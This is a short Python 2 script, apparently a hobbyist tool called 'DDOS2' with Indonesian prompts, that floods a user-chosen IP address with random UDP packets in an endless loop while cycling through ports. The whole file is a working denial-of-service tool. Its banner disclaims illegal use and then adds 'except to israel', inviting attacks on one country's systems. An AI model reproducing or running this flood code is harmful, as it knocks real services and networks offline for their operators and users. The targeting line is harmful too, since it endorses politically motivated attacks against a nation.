import sys
import socket
import time
import random
import os
from datetime import datetime

#time
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

#terminal clear all session
os.system("clear")

#terminal display DDOS 2 as figlet
os.system("figlet -f mono12 DDOS2")

#display text use echo
os.system("      echo 'dont use for illegal activities'")
time.sleep(1)

os.system("      echo 'except to israel'")
time.sleep(2)
#Bannerku
banner="""
|------------------------------------|
 Author : Mika259(M1K259)
 Github : https://github.com/Mika259
 Version : 0.1
|------------------------------------|
"""
#display bannerku

GREEN   = '\033[32m'
CYAN    = '\033[46m'

print(GREEN+banner)

ip = raw_input("Masukkan Ip : ")
port = input("Masukkan Port : ")

#Run Untuk Terminal
os.system("clear")

time.sleep(0.5)
os.system("echo '....Attack Starting....'")
os.system("clear")
time.sleep(1)
print("....Wait a seccond...")
time.sleep(0.5)

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "\033[46m sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
#Maaf jika ada Kesalahan , tolong tegur :)
